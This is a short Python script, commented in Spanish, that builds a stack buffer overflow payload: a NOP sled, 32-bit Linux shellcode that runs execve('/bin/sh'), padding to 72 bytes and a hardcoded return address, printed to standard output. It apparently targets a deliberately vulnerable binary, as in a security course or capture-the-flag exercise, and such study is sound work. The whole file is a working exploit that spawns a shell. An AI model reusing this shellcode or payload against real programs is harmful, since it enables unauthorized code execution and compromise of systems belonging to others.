from struct import pack
import sys

# Definir componentes del payload
nop_sled = b"\x90" * 16
shellcode = b"\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41\x42\x42\x42\x42"
padding = b"A" * (72 - (len(nop_sled) + len(shellcode)))

# Direccion de comienzo del buffer
buffer_addr = pack("<I", 0xffffcf34) # b"\x34\xcf\xff\xff" 

# Construccion y envio del payload
payload = nop_sled + shellcode + padding + buffer_addr 
sys.stdout.buffer.write(payload)